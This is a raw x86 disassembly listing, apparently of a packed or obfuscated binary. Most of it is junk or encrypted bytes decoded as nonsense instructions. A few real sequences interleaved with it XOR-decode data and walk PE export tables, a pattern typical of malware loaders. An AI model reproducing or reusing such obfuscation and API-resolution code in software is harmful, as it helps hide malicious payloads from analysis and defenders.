  4072ac:	xor    bl,al
  4072ae:	and    edi,DWORD PTR [edi-0x5b]
  4072b1:	pop    edx
  4072b2:	cdq    
  4072b3:	test   al,0x48
  4072b5:	retf   0x4636
  4072b8:	retf   0xf195
  4072bb:	fidivr DWORD PTR [ebx-0x4a8a406e]
  4072c1:	jg     0x4072be
  4072c3:	xchg   ah,ah
  4072c5:	jmp    0x143f:0xec41faa5
  4072cc:	mov    ebx,0x8f2504b0
  4072d1:	jg     0x40725e
  4072d3:	nop
  4072d4:	int    0x3a
  4072d6:	imul   edi,DWORD PTR [eax],0x7c
  4072d9:	inc    ecx
  4072da:	adc    DWORD PTR [edx+0x68],esi
  4072dd:	push   edx
  4072de:	or     DWORD PTR [ebx+0x7f78d581],0xb3ab5ca6
  4072e8:	test   BYTE PTR [eax],ah
  4072ea:	nop
  4072eb:	ficom  WORD PTR [ebp+edx*1+0x1a]
  4072ef:	mov    esp,0x7132dea7
  4072f4:	nop
  4072f5:	neg    BYTE PTR [ecx-0x43422ee8]
  4072fb:	and    eax,0xf1e08bb3
  407300:	cmp    dh,BYTE PTR [ebx+0x31]
  407303:	pop    ebp
  407304:	sbb    eax,0x54a3ade7
  407309:	pop    ss
  40730a:	es (bad) 
  40730c:	jno    0x40735d
  40730e:	mov    eax,0xa4317c8f
  407313:	and    bl,BYTE PTR [edx]
  407315:	loope  0x407331
  407317:	sbb    BYTE PTR [edi],bh
  407319:	fucomip st,st(0)
  40731b:	retf   
  40731c:	cmp    BYTE PTR [ecx-0x5b],dl
  40731f:	into   
  407320:	sbb    al,0x3f
  407322:	dec    edx
  407323:	lods   eax,DWORD PTR ds:[esi]
  407324:	fisubr DWORD PTR [eax-0x4d68cfde]
  40732a:	pop    edx
  40732b:	in     al,dx
  40732c:	xor    al,0xb1
  40732e:	sub    ebp,DWORD PTR [ebx]
  407330:	mov    eax,DWORD PTR [edi]
  407332:	mov    edx,DWORD PTR [edi+0x4]
  407335:	xor    edx,ebx
  407337:	xor    eax,esi
  407339:	jmp    0x407411
  40733e:	xchg   BYTE PTR [ecx+0x37],cl
  407341:	push   edi
  407342:	(bad)  
  407343:	jg     0x40732b
  407345:	fldenv [eax-0x5143b1da]
  40734b:	int    0x94
  40734d:	int3   
  40734e:	sar    BYTE PTR [esi],cl
  407350:	add    BYTE PTR [eax],al
  407352:	mov    ebx,0xad000000
  407357:	mov    esp,0x281f9fa9
  40735c:	in     al,0x81
  40735e:	add    ecx,ecx
  407360:	mov    WORD PTR [eax-0x37],?
  407363:	dec    edi
  407364:	push   es
  407365:	cmp    al,0x1e
  407367:	fmul   st,st(6)
  407369:	arpl   ax,dx
  40736b:	imul   edi,DWORD PTR [eax],0xd1a2b457
  407371:	or     ch,bh
  407373:	sub    al,0xe
  407375:	cwde   
  407376:	xchg   dl,dh
  407378:	fmul   DWORD PTR [esi]
  40737a:	outs   dx,DWORD PTR ds:[esi]
  40737b:	mov    ebp,DWORD PTR [edx+ebx*1+0xa]
  40737f:	pop    esp
  407380:	xor    BYTE PTR [eax],dl
  407382:	sub    cl,BYTE PTR [edi]
  407384:	and    eax,DWORD PTR [eax]
  407386:	shl    BYTE PTR [ebx+0x6afd5916],0xcc
  40738d:	repnz sub ebx,ebx
  407390:	jge    0x407321
  407392:	test   eax,ebx
  407394:	ds pop es
  407396:	les    eax,FWORD PTR [edi+esi*4]
  407399:	xchg   esi,eax
  40739a:	aam    0x14
  40739c:	lds    esp,FWORD PTR [ebp+0x790602a9]
  4073a2:	sub    ebp,ecx
  4073a4:	mov    ecx,0xdf352d94
  4073a9:	sub    ah,al
  4073ab:	mul    BYTE PTR es:[esi+0x36]
  4073af:	push   esi
  4073b0:	and    BYTE PTR [ebx],ah
  4073b2:	aam    0xa8
  4073b4:	add    BYTE PTR [edi],cl
  4073b6:	mov    esi,0xfe626bfa
  4073bb:	dec    esi
  4073bc:	cs mov ch,0x5c
  4073bf:	and    ecx,DWORD PTR [eax]
  4073c1:	and    ebp,edx
  4073c3:	pop    eax
  4073c4:	fldenv [ebx+0x2c]
  4073c7:	dec    ebx
  4073c8:	dec    ebx
  4073c9:	rcr    edi,1
  4073cb:	xlat   BYTE PTR ds:[ebx]
  4073cc:	jb     0x4073f1
  4073ce:	jb     0x40737c
  4073d0:	gs out dx,al
  4073d2:	fldcw  WORD PTR [esi]
  4073d4:	mov    ebx,0x63da5423
  4073d9:	frstor [ecx]
  4073db:	inc    ebx
  4073dc:	mov    eax,ds:0xa0125e19
  4073e1:	push   ebp
  4073e2:	mov    al,ss:0x8b086c67
  4073e8:	mov    al,0xd9
  4073ea:	ss aad 0x56
  4073ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073ee:	inc    esp
  4073ef:	loope  0x40738c
  4073f1:	test   esi,0x7ce63a58
  4073f7:	push   ebx
  4073f8:	bound  esi,QWORD PTR [esi+0x576d5188]
  4073fe:	retf   0xe3b3
  407401:	jnp    0x40746e
  407403:	xchg   DWORD PTR [ebx+0x33],edx
  407406:	inc    esi
  407407:	shl    BYTE PTR [ecx+0x7],0x21
  40740b:	stos   DWORD PTR es:[edi],eax
  40740c:	pop    ss
  40740d:	dec    eax
  40740e:	sbb    ch,BYTE PTR [ebp+0x624d053b]
  407414:	mov    eax,0xdcd28199
  407419:	lea    eax,[eax]
  40741b:	add    BYTE PTR [ecx+0x18b1845],cl
  407421:	mov    DWORD PTR [ebp+0x1c],edx
  407424:	mov    edx,DWORD PTR [ecx+0x4]
  407427:	jmp    0x4074ff
  40742c:	shr    esi,1
  40742e:	adc    dh,dl
  407430:	aas    
  407431:	(bad)  
  407432:	xlat   BYTE PTR ds:[ebx]
  407433:	out    dx,eax
  407434:	jb     0x40749c
  407436:	cmp    ecx,ebp
  407438:	or     eax,0x8dde8490
  40743d:	aas    
  40743e:	add    BYTE PTR [eax],al
  407440:	mov    ebx,0x18000000
  407445:	hlt    
  407446:	sbb    BYTE PTR [ecx+0x7657c491],0x8c
  40744d:	ffree  st(0)
  40744f:	jg     0x4074a2
  407451:	inc    edx
  407452:	pop    es
  407453:	and    eax,0x6f3754ba
  407458:	sbb    ebx,DWORD PTR [ecx-0x375527bb]
  40745e:	pop    ss
  40745f:	(bad)  
  407461:	pop    ebx
  407462:	xor    al,0x8d
  407464:	and    al,0x44
  407466:	ror    BYTE PTR [edi],1
  407468:	mov    dh,0x80
  40746a:	jg     0x4074e6
  40746c:	jnp    0x407488
  40746e:	aas    
  40746f:	fistp  DWORD PTR [eax]
  407471:	xor    eax,0x33814d35
  407476:	aas    
  407477:	mov    esi,0x6f22eb82
  40747c:	add    eax,0x3219cd5
  407481:	jmp    0x5efd:0x8d206dcb
  407488:	dec    ecx
  407489:	xchg   ah,ah
  40748b:	jl     0x407488
  40748d:	ror    BYTE PTR [edx+edx*2+0x4c],1
  407491:	clc    
  407492:	fs adc al,0x59
  407495:	push   ecx
  407496:	dec    edi
  407497:	div    DWORD PTR [edi+0x12]
  40749a:	mov    fs,edi
  40749c:	pushf  
  40749d:	mov    gs,WORD PTR [ebx+0xe]
  4074a0:	and    ebp,DWORD PTR [ebx+ebx*2]
  4074a3:	or     BYTE PTR [edi+ebx*4],bl
  4074a6:	mov    ebx,0xc6dbea21
  4074ab:	xchg   edi,eax
  4074ac:	add    eax,0x82c87b8a
  4074b1:	adc    esp,DWORD PTR [ebp+0x17]
  4074b4:	cs (bad) 
  4074b6:	mov    cl,0xe7
  4074b8:	out    dx,eax
  4074b9:	or     eax,0xd176d1a3
  4074be:	ror    BYTE PTR [edx+0xa65cfdd],cl
  4074c4:	out    0x49,al
  4074c6:	in     al,0x9f
  4074c8:	push   ebp
  4074c9:	jb     0x407471
  4074cb:	jmp    0xbd49:0xbd862264
  4074d2:	dec    esi
  4074d3:	sbb    BYTE PTR ds:0x5d174d29,ah
  4074d9:	sbb    dh,BYTE PTR [ecx]
  4074db:	push   ecx
  4074dc:	(bad)  
  4074dd:	mov    edx,0xd2bbc401
  4074e2:	push   esp
  4074e3:	jecxz  0x4074ca
  4074e5:	xchg   esp,eax
  4074e6:	fs js  0x40755d
  4074e9:	out    dx,al
  4074ea:	shl    ah,0x4c
  4074ed:	shl    BYTE PTR [ebx-0x5b82397e],0x6e
  4074f4:	pop    ecx
  4074f5:	lea    esp,[esi+0x46]
  4074f8:	mov    BYTE PTR [edi+0x6],cl
  4074fb:	(bad)  
  4074fd:	mov    ss,WORD PTR [edi+0x33]
  407500:	(bad)  
  407501:	jmp    0x4075d9
  407506:	test   BYTE PTR [esi-0x39],bh
  407509:	cmp    edi,edi
  40750b:	mov    ebx,0x1fbefffc
  407510:	pushf  
  407511:	aas    
  407512:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407513:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407514:	dec    esp
  407515:	xor    ecx,DWORD PTR [eax+0x40]
  407518:	add    BYTE PTR [eax],al
  40751a:	mov    ebx,0x44000000
  40751f:	jns    0x407575
  407521:	add    DWORD PTR cs:[eax+0x33],ecx
  407525:	lea    edx,[ebx]
  407527:	and    al,0xb1
  407529:	shl    BYTE PTR [esi-0x1a],cl
  40752c:	bnd ja 0x407510
  40752f:	jl     0x4075a4
  407531:	cmp    edx,esp
  407533:	adc    DWORD PTR [ebx-0x6],ebx
  407536:	and    DWORD PTR [edi+0xf],ebx
  407539:	xchg   ecx,eax
  40753a:	dec    edx
  40753b:	fwait
  40753c:	push   eax
  40753d:	pop    edi
  40753e:	mov    eax,DWORD PTR [edx-0x75cfbe7f]
  407544:	xchg   BYTE PTR [eax],cl
  407546:	mov    ebp,0x34d05794
  40754b:	pop    esp
  40754c:	sub    BYTE PTR [esi+0x5b],dh
  40754f:	mov    eax,ds:0x113b95c4
  407555:	test   al,0xdb
  407557:	lods   al,BYTE PTR ds:[esi]
  407558:	lea    ebx,[edx+0xc]
  40755b:	pop    edi
  40755c:	jo     0x4075ab
  40755e:	int    0x96
  407560:	or     eax,DWORD PTR [ecx-0x2a78722b]
  407566:	sbb    al,0x4
  407568:	jecxz  0x407571
  40756a:	push   ss
  40756b:	and    al,BYTE PTR [eax+0x75]
  40756e:	bound  eax,QWORD PTR [edi+0x78f4ad11]
  407574:	mov    esi,0x5199d0f5
  407579:	out    dx,al
  40757a:	or     al,0xa3
  40757c:	fadd   DWORD PTR [esp+edi*8+0x4a]
  407580:	cld    
  407581:	enter  0x587f,0xda
  407585:	add    al,0x45
  407587:	rol    DWORD PTR [ebx+edi*8],1
  40758a:	mov    eax,ds:0x531f1417
  40758f:	jmp    0xfd4216ef
  407594:	fwait
  407595:	jno    0x4075d4
  407597:	(bad)  
  407598:	dec    BYTE PTR [ebp+0x4a]
  40759b:	popa   
  40759c:	ds test al,0x12
  40759f:	test   eax,0x954b0eaa
  4075a4:	mov    cl,0x99
  4075a6:	iret   
  4075a7:	fbstp  TBYTE PTR [edi]
  4075a9:	hlt    
  4075aa:	int3   
  4075ab:	jp     0x407591
  4075ad:	mov    ebx,edi
  4075af:	xor    BYTE PTR [ecx-0xafd53d2],ah
  4075b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075b6:	les    ebx,FWORD PTR [ecx-0x2f]
  4075b9:	pop    esp
  4075ba:	sub    eax,DWORD PTR [edx-0x449a6a72]
  4075c0:	fdivr  st(1),st
  4075c2:	and    al,0xa7
  4075c4:	popa   
  4075c5:	mov    ecx,DWORD PTR [edi]
  4075c7:	test   DWORD PTR [ebx+0x6a23ffda],eax
  4075cd:	adc    DWORD PTR [eax+0xc04d76d],0x3e
  4075d4:	mov    ebx,eax
  4075d6:	sbb    dl,BYTE PTR [eax+0x5d33371]
  4075dc:	dec    ebp
  4075dd:	bound  edi,QWORD PTR [eax-0x232d7e67]
  4075e3:	lea    eax,[eax]
  4075e5:	add    BYTE PTR [ecx-0x2c165bab],cl
  4075eb:	add    BYTE PTR [eax],al
  4075ed:	add    BYTE PTR [ebx],bh
  4075ef:	push   es
  4075f0:	add    DWORD PTR [ebp+edi*1-0x22484071],ecx
  4075f7:	adc    esi,eax
  4075f9:	xor    eax,DWORD PTR [ecx]
  4075fb:	fcom   st(4)
  4075fd:	jp     0x407602
  4075ff:	inc    ecx
  407600:	add    BYTE PTR [eax],al
  407602:	mov    ebx,0x71000000
  407607:	lahf   
  407608:	in     eax,dx
  407609:	xchg   esi,eax
  40760a:	mov    ?,WORD PTR [ebp-0x11]
  40760d:	mov    ecx,0x9f7a4428
  407612:	adc    dh,BYTE PTR [esi]
  407614:	out    0xfb,al
  407616:	mov    ds:0x1169dd01,al
  40761b:	xchg   edi,eax
  40761c:	and    DWORD PTR [edx],ebp
  40761e:	shl    edx,1
  407620:	call   0xd0e0debc
  407625:	pop    edi
  407626:	fs scas al,BYTE PTR es:[edi]
  407628:	in     al,0xaa
  40762a:	aas    
  40762b:	cmp    cl,BYTE PTR [ebp-0x6b]
  40762e:	bound  ebx,QWORD PTR ds:0xab667fc4
  407634:	ss enter 0x18c,0x26
  407639:	adc    ah,BYTE PTR [eax+0x100d8210]
  40763f:	shr    BYTE PTR ds:0x301ff852,cl
  407645:	imul   ebx,DWORD PTR [ecx-0x2f801d73],0x29ead28a
  40764f:	mov    ah,0xdd
  407651:	mov    al,ds:0x11d35a54
  407656:	out    dx,al
  407657:	pop    ebp
  407658:	mov    esi,0x8ab68a38
  40765d:	das    
  40765e:	out    0x21,al
  407660:	pop    edi
  407661:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407662:	xchg   DWORD PTR [edi+0x32acea6e],esi
  407668:	and    al,0x90
  40766a:	out    dx,al
  40766b:	sbb    eax,esp
  40766d:	xchg   ecx,eax
  40766e:	(bad)  
  40766f:	mov    edi,0xed842037
  407674:	js     0x40767d
  407676:	retf   
  407677:	xchg   ebx,eax
  407678:	and    esi,ebp
  40767a:	loopne 0x407691
  40767c:	lock adc bh,dh
  40767f:	xlat   BYTE PTR ds:[ebx]
  407680:	dec    ebp
  407681:	sub    ah,ah
  407683:	jecxz  0x407653
  407685:	dec    ebp
  407686:	fstp   QWORD PTR [ebx+0x3a050310]
  40768c:	inc    ebp
  40768d:	aas    
  40768e:	rcl    DWORD PTR [edx-0x1e4bd58e],0xbf
  407695:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407696:	sub    esp,esp
  407698:	jbe    0x40770e
  40769a:	jge    0x4076c9
  40769c:	adc    bl,ch
  40769e:	jle    0x4076e2
  4076a0:	stos   BYTE PTR es:[edi],al
  4076a1:	addr16 pop edi
  4076a3:	fcom   QWORD PTR [edx]
  4076a5:	lds    edi,FWORD PTR [esi+0x7192ed97]
  4076ab:	(bad)  
  4076ac:	xor    BYTE PTR [esi-0x39af89ad],cl
  4076b2:	aad    0x3c
  4076b4:	dec    edi
  4076b5:	inc    ebx
  4076b6:	cmp    al,0xa2
  4076b8:	test   DWORD PTR [edi+ecx*4],edi
  4076bb:	push   0x67
  4076bd:	stos   DWORD PTR es:[edi],eax
  4076be:	ja     0x407658
  4076c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076c1:	cmp    DWORD PTR [ebp+0x18],eax
  4076c4:	jne    0x4077ad
  4076ca:	mov    eax,edx
  4076cc:	jmp    0x4077a4
  4076d1:	inc    edi
  4076d2:	mov    al,0x9f
  4076d4:	cmc    
  4076d5:	(bad)  
  4076d6:	jmp    FWORD PTR [edi-0x4e]
  4076d9:	idiv   DWORD PTR [edi+0x4f3c1c47]
  4076df:	mov    cl,0x3f
  4076e1:	mov    esi,0xbb000041
  4076e6:	add    BYTE PTR [eax],al
  4076e8:	add    BYTE PTR [edx-0x7931773e],cl
  4076ee:	data16 add bl,BYTE PTR [ebp-0x4]
  4076f2:	rcr    DWORD PTR [ecx-0x6f],cl
  4076f5:	xor    edi,edx
  4076f7:	call   0x84cfdf20
  4076fc:	push   0x6c3445fb
  407701:	xchg   edi,eax
  407702:	arpl   sp,dx
  407704:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407705:	xchg   edi,eax
  407706:	(bad)  
  407707:	shr    DWORD PTR [ecx-0x57],cl
  40770a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40770b:	mov    al,ds:0xd3d808f0
  407710:	inc    edi
  407711:	mov    al,ds:0x9f537c72
  407716:	repnz fsub st,st(2)
  407719:	lea    esp,[ecx]
  40771b:	or     edx,ebp
  40771d:	add    edx,0xffffffd7
  407720:	inc    esp
  407721:	dec    edi
  407722:	stos   BYTE PTR es:[edi],al
  407723:	sbb    DWORD PTR [edx],ecx
  407725:	test   al,0x9c
  407727:	int3   
  407728:	cdq    
  407729:	daa    
  40772a:	fadd   st,st(3)
  40772c:	mov    esp,0xe7c0e9b9
  407731:	js     0x4076d7
  407733:	ss mov bh,0xa7
  407736:	xchg   ebp,eax
  407737:	lods   eax,DWORD PTR ds:[esi]
  407738:	loop   0x407789
  40773a:	push   ebp
  40773b:	mov    ah,0x5e
  40773d:	sbb    eax,0x12467e5
  407742:	and    cl,dl
  407744:	mov    dh,0xc9
  407746:	dec    ebp
  407747:	inc    edx
  407748:	sub    al,bl
  40774a:	push   0xb5e3542a
  40774f:	(bad)  
  407750:	pop    eax
  407751:	jne    0x4077c2
  407753:	mov    DWORD PTR [eax],edi
  407755:	ror    cl,0x99
  407758:	push   ebp
  407759:	test   ch,bh
  40775b:	cs and eax,0x7f6cc9a4
  407761:	and    BYTE PTR [ebp+0x77],al
  407764:	mov    esp,0xce91deba
  407769:	fucomip st,st(2)
  40776b:	cmp    ah,0x72
  40776e:	sahf   
  40776f:	ins    BYTE PTR es:[edi],dx
  407770:	xor    BYTE PTR [esi],al
  407772:	mov    ecx,0x75fee58c
  407777:	push   ebx
  407778:	xor    ch,BYTE PTR [ebx]
  40777a:	imul   edx,DWORD PTR [edx-0x7f8be155],0x33525b9e
  407784:	arpl   WORD PTR [esi+0x1b],bp
  407787:	xchg   edx,eax
  407788:	loope  0x40779f
  40778a:	mov    ds:0x67d6e09b,eax
  40778f:	(bad)  
  407790:	mov    al,ds:0x42226b92
  407795:	mov    al,ds:0xb589544f
  40779a:	imul   edx,ebx,0x13
  40779d:	loopne 0x40776d
  40779f:	pop    esp
  4077a0:	test   DWORD PTR [edx+0x4539322c],eax
  4077a6:	sbb    al,0xf
  4077a8:	test   BYTE PTR [eax-0x74fffffe],dh
  4077ae:	inc    ebp
  4077af:	or     BYTE PTR [ebx+0x558b0c55],cl
  4077b5:	cld    
  4077b6:	mov    edx,DWORD PTR [edx+0x3c]
  4077b9:	lea    eax,[edx+eax*8+0x78]
  4077bd:	jmp    0x407895
  4077c2:	mov    fs,edi
  4077c4:	pop    ebx
  4077c5:	sar    DWORD PTR [ebx-0x3],0x9e
  4077c9:	out    dx,eax
  4077ca:	or     DWORD PTR [ebp+esi*4-0x7794d91c],ebx
  4077d1:	add    bh,BYTE PTR [ecx+0x42]
  4077d4:	add    BYTE PTR [eax],al
  4077d6:	mov    ebx,0x64000000
  4077db:	in     eax,0x96
  4077dd:	clc    
  4077de:	ja     0x4077ef
  4077e0:	lea    edi,[esi+0x665fedfc]
  4077e6:	sub    cl,BYTE PTR fs:[ebp-0x18f301cf]
  4077ed:	jno    0x40784e
  4077ef:	fwait
  4077f0:	xchg   edi,eax
  4077f1:	jecxz  0x407858
  4077f3:	and    al,0xea
  4077f5:	adc    DWORD PTR [esi],esp
  4077f7:	push   esi
  4077f8:	mov    bl,0xd3
  4077fa:	enter  0xa21b,0x36
  4077fe:	or     ch,BYTE PTR [ebx+0x5d78d79e]
  407804:	sbb    eax,0xe34bc471
  407809:	cld    
  40780a:	pop    ebp
  40780b:	sub    BYTE PTR [esi],ch
  40780d:	jmp    0xe221:0x356ab4da
  407814:	movlhps xmm5,xmm0
  407817:	das    
  407818:	jle    0x4077aa
  40781a:	jbe    0x407827
  40781c:	imul   edx,DWORD PTR [ebx+0x1d],0x4e
  407820:	mov    dl,BYTE PTR [edx]
  407822:	or     dl,al
  407824:	repnz fisubr DWORD PTR [edx]
  407827:	ror    edx,0xcf
  40782a:	adc    DWORD PTR ds:0x78972585,eax
  407830:	mov    edx,0x66dd4144
  407835:	aaa    
  407836:	(bad)  
  407837:	aad    0x2e
  407839:	dec    ebx
  40783a:	push   edi
  40783b:	push   edi
  40783c:	add    edi,DWORD PTR [esi-0x75]
  40783f:	jne    0x40785e
  407841:	cmp    dl,dh
  407843:	add    al,BYTE PTR [eax-0x2f]
  407846:	push   es
  407847:	pop    ebp
  407848:	lods   al,BYTE PTR ds:[esi]
  407849:	pop    edi
  40784a:	push   eax
  40784b:	mov    esp,0xbb622f49
  407850:	and    esi,ebp
  407852:	ins    DWORD PTR es:[edi],dx
  407853:	mov    ecx,0xbc8a3c9c
  407858:	jge    0x407869
  40785a:	xchg   esi,eax
  40785b:	push   ecx
  40785c:	add    DWORD PTR [esi+0x71],ecx
  40785f:	js     0x407885
  407861:	dec    eax
  407862:	(bad)  
  407863:	in     al,0xa5
  407865:	inc    edx
  407866:	imul   edi,esi,0x1c95bde8
  40786c:	scas   al,BYTE PTR es:[edi]
  40786d:	mov    dl,0x71
  40786f:	loope  0x407801
  407871:	inc    ebx
  407872:	dec    edi
  407873:	add    al,0x39
  407875:	(bad)  
  407877:	push   eax
  407878:	pop    ebp
  407879:	(bad)  
  40787a:	cmp    ch,BYTE PTR [ebx-0x39]
  40787d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40787e:	outs   dx,BYTE PTR ds:[esi]
  40787f:	mov    ch,0x20
  407881:	xchg   DWORD PTR [esi+0x70],esi
  407884:	push   cs
  407885:	iret   
  407886:	pop    es
  407887:	and    BYTE PTR [edi],cl
  407889:	inc    eax
  40788a:	rcr    bl,0xf2
  40788d:	sub    al,0x28
  40788f:	out    dx,eax
  407890:	sub    eax,0xaa65a98
  407895:	mov    edx,DWORD PTR [ebp-0x4]
  407898:	mov    eax,DWORD PTR [edx+eax*1]
  40789b:	mov    DWORD PTR [ebp-0xc],eax
  40789e:	jmp    0x407976
  4078a3:	call   0x9b7d:0xff382b4e
  4078aa:	out    dx,al
  4078ab:	pop    ecx
  4078ac:	ss icebp 
  4078ae:	addr16 fcmovnu st,st(1)
  4078b1:	aas    
  4078b2:	int    0x34
  4078b4:	inc    ebx
  4078b5:	add    BYTE PTR [eax],al
  4078b7:	mov    ebx,0x3b000000
  4078bc:	in     al,0xde
  4078be:	ds xchg ecx,eax
  4078c0:	pusha  
  4078c1:	aaa    
  4078c2:	adc    al,0x46
  4078c4:	push   ecx
  4078c5:	jo     0x4078b8
  4078c7:	xchg   esi,eax
  4078c8:	or     ch,bl
  4078ca:	test   bl,al
  4078cc:	out    dx,eax
  4078cd:	ret    0x44fb
  4078d0:	test   BYTE PTR [ebx+0x43],0x42
  4078d4:	cmp    ecx,DWORD PTR [ecx-0x71]
  4078d7:	push   ecx
  4078d8:	test   al,0x52
  4078da:	scas   al,BYTE PTR es:[edi]
  4078db:	push   0xff56442d
  4078e0:	test   eax,0x945574d5
  4078e5:	jo     0x40794e
  4078e7:	xchg   edx,eax
  4078e8:	cmp    dh,BYTE PTR [edx-0x8]
  4078eb:	je     0x4078b3
  4078ed:	popf   
  4078ee:	mov    dh,0x1a
  4078f0:	call   0x7d57:0x6c548bf4
  4078f7:	loope  0x40788d
  4078f9:	cmp    DWORD PTR [ebx-0x5c56231e],esi
  4078ff:	lock add bh,ah
  407902:	fsub   QWORD PTR [ebx]
  407904:	jnp    0x407954
  407906:	pop    ds
  407907:	fs call 0x3b0:0x391109f9
  40790f:	retf   0xa9dc
  407912:	fwait
  407913:	jge    0x40794b
  407915:	ins    DWORD PTR es:[edi],dx
  407916:	pop    ebx
  407917:	int    0xa3
  407919:	push   0x7f4e8908
  40791e:	retf   0x16d
  407921:	es cs test eax,0xc586b492
  407928:	test   BYTE PTR [ecx+0x75],dl
  40792b:	je     0x407928
  40792d:	or     eax,0xf9ca3a19
  407932:	push   esi
  407933:	cmp    al,0xc9
  407935:	sti    
  407936:	fld    DWORD PTR [ebx]
  407938:	loop   0x407971
  40793a:	mov    ebx,0x2e3c9590
  40793f:	inc    ebp
  407940:	ret    
  407941:	shl    BYTE PTR [edx+ebp*4],0xd8
  407945:	push   ebp
  407946:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407947:	cmp    ebp,DWORD PTR [ebx+0x46055e56]
  40794d:	xchg   cl,dl
  40794f:	push   ss
  407950:	sub    BYTE PTR [eax],dl
  407952:	imul   ecx,DWORD PTR [eax-0x28],0x1771f255
  407959:	dec    ecx
  40795a:	adc    BYTE PTR [eax-0x6f689503],cl
  407960:	pushf  
  407961:	fstp   DWORD PTR [ebx]
  407963:	dec    esp
  407964:	out    dx,al
  407965:	jle    0x407955
  407967:	jp     0x407903
  407969:	or     esp,DWORD PTR ds:0xf89df00
  40796f:	cmp    eax,0xa68dcf32
  407974:	jnp    0x4079de
  407976:	mov    eax,DWORD PTR [edi]
  407978:	mov    edx,DWORD PTR [edi+0x4]
  40797b:	xor    eax,esi
  40797d:	jmp    0x407a55
  407982:	ret    0xa28d
  407985:	(bad)  
  407986:	out    dx,eax
  407987:	push   esi
  407989:	popf   
  40798a:	ds js  0x4079ab
  40798d:	in     al,0xae
  40798f:	fwait
  407990:	mov    WORD PTR [eax-0x11],?
  407993:	inc    ebx
  407994:	add    BYTE PTR [eax],al
  407996:	mov    ebx,0x16000000
  40799b:	(bad)  
  40799d:	dec    ebp
  40799e:	cs mov ecx,0xdd1b45c8
  4079a4:	(bad)  
  4079a5:	(bad)  
  4079a7:	dec    ecx
  4079a8:	scas   eax,DWORD PTR es:[edi]
  4079a9:	cwde   
  4079aa:	aaa    
  4079ab:	push   esp
  4079ac:	mov    edx,0x584b9ba
  4079b1:	xchg   esp,eax
  4079b2:	aad    0x8e
  4079b4:	imul   edx,DWORD PTR [ebp-0x16],0xf39d084
  4079bb:	mov    bh,0xc1
  4079bd:	dec    eax
  4079be:	mov    BYTE PTR [ecx+0x1a],bh
  4079c1:	xchg   ebp,eax
  4079c2:	push   ss
  4079c3:	xor    al,0x51
  4079c5:	or     edi,edx
  4079c7:	xlat   BYTE PTR ds:[ebx]
  4079c8:	mov    esi,0x46e23e7e
  4079cd:	aaa    
  4079ce:	pop    eax
  4079cf:	push   ds
  4079d0:	or     eax,ebp
  4079d2:	jmp    0xe4c1:0x858879ea
  4079d9:	sbb    al,0xbe
  4079db:	pop    ds
  4079dc:	sub    edx,DWORD PTR [ebp-0x4c2ca64a]
  4079e2:	mov    edx,0xdc03fde7
  4079e7:	aam    0x33
  4079e9:	push   0xa7f11e4d
  4079ee:	out    dx,al
  4079ef:	and    BYTE PTR [eax+0x1],0x41
  4079f3:	push   0x28
  4079f5:	in     al,dx
  4079f6:	inc    esp
  4079f7:	cmp    BYTE PTR [edx],bh
  4079f9:	imul   eax,DWORD PTR [eax],0xfe0e36f9
  4079ff:	mov    edi,0xe4a7ddc3
  407a04:	dec    ebx
  407a05:	adc    ecx,DWORD PTR [esi+0x18]
  407a08:	ins    DWORD PTR es:[edi],dx
  407a09:	call   DWORD PTR [edi+eiz*2+0x6d07e78e]
  407a10:	lock or BYTE PTR [ecx+ebx*2],ch
  407a14:	pop    ebx
  407a15:	std    
  407a16:	add    eax,0x18f583df
  407a1b:	xor    cl,BYTE PTR [edx+0x6b]
  407a1e:	(bad)  
  407a1f:	cld    
  407a20:	into   
  407a21:	aam    0x74
  407a23:	push   ebp
  407a24:	cmp    BYTE PTR fs:[ebp+0x35],0x2
  407a29:	add    BYTE PTR [ebx+eiz*2+0x67],cl
  407a2d:	and    BYTE PTR [edx+ebx*2-0x30],0x78
  407a32:	jmp    0x407a10
  407a34:	add    ebx,DWORD PTR [edi-0x3f9860e]
  407a3a:	cmc    
  407a3b:	push   0x11
  407a3d:	ret    
  407a3e:	or     al,0xcd
  407a40:	mov    ds:0xbff346b9,eax
  407a46:	xchg   ebx,eax
  407a47:	test   eax,0xa4aa8df
  407a4c:	adc    dh,BYTE PTR ds:0x60291918
  407a52:	call   0x479d:0xb32d41e8
  407a59:	mov    WORD PTR [ebp-0x10],ax
  407a5d:	mov    eax,DWORD PTR [ebp-0xc]
  407a60:	xor    edx,edx
  407a62:	add    eax,0x66479db3
  407a67:	adc    edx,0xffff7223
  407a6d:	jmp    0x407b45
  407a72:	add    eax,0x67806646
  407a77:	mov    al,ds:0x3b4fc7e7
  407a7c:	dec    ebp
  407a7d:	adc    esi,DWORD PTR [si-0x2a]
  407a81:	or     eax,0x44aa
  407a86:	mov    ebx,0x5000000
  407a8b:	xchg   esp,eax
  407a8c:	inc    esi
  407a8d:	or     ecx,DWORD PTR [ebx-0x72]
  407a90:	mov    esp,0x438e39e7
  407a95:	mov    ds:0x2e430eda,eax
  407a9a:	mov    ebp,0xb8126092
  407a9f:	(bad)  
  407aa1:	test   BYTE PTR [eax-0x7d784316],ch
  407aa7:	jnp    0x407a3d
  407aa9:	push   esi
  407aaa:	and    ebx,esi
  407aac:	or     esp,DWORD PTR [esi-0x41b9920a]
  407ab2:	jmp    0x4b4d0cf4
  407ab7:	mov    bh,0xb5
  407ab9:	jno    0x407af3
  407abb:	pop    ebx
  407abc:	sbb    ebx,ecx
  407abe:	xor    BYTE PTR [edx*8-0x51ad42f8],0x36
  407ac6:	fs cli 
  407ac8:	mov    BYTE PTR [edx-0x1d],dh
  407acb:	push   esi
  407acc:	sub    bh,ah
  407ace:	aas    
  407acf:	imul   ebp,DWORD PTR [edx+0x4bfd9bd8],0x4f607a66
  407ad9:	adc    BYTE PTR [eax+0x32b99749],dh
  407adf:	lock loopne 0x407a8e
  407ae2:	out    dx,al
  407ae3:	jb     0x407a91
